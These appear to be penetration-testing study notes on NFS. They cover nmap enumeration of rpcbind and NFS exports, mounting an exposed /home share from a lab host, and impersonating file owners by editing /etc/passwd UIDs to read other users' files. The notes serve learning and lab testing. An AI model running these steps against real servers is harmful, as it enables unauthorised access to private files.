Network File System - Distributed file system protocol allowing a user on a client computer to access files over a computer network as if they were on locally-mounted storage.  
  
Often used w/ UNIX OS's, predominantly insecure in its implementation, and easy to leverage.  
  
  
**Portmapper** and [RPCbind](RPCbind.md) run on 111/TCP  
```bash
nmap -sV -p 111 --script=rpcinfo <ip>
```


**Portmapper** manages the port mappings of a UPnP enabled internet gateway device in the local network  
  
[RPCbind](RPCbind.md) maps RPC services to the ports on which they listen  
  
  
[nmap](Tools.md#nmap) - has 3 [NSE scripts](Tools.md#nse%20scripts) located in _/usr/share/nmap/scripts/nfs*_  
  
Can be run together: 
```bash
nmap -p 111 --script=nfs* <ip>
```

 
Nmap scan report for 10.11.1.72  
PORT STATE SERVICE  
111/tcp open rpcbind  
| nfs-showmount:  
|_ /home 10.11.0.0/255.255.0.0  
  
^^ Shows the entire **/home** directory is being shared and can be mounted.  
  
**-o** **nolock** is used to disable file locking - often needed for older NFS servers  
  
```bash
mkdir home  
sudo mount -o nolock 10.11.1.72:/home ~/home/  
cd home/ && ls  
        jenny joe45 john marcus ryuu
```

^^ Shows multiple users' home directories  
  
Likely won't have permission to view files, so we can [adduser](User%20Mgmt.md), use [sed](OS%20Commands.md#sed) to change it's UUID to the same UUID of the owner of the desired file, [su](User%20Mgmt.md) to that user, and try accessing again.  
  
To change a UUID:  
```bash
sudo sed -i -e 's/old_UUID/new_UUID/g' /etc/passwd
```
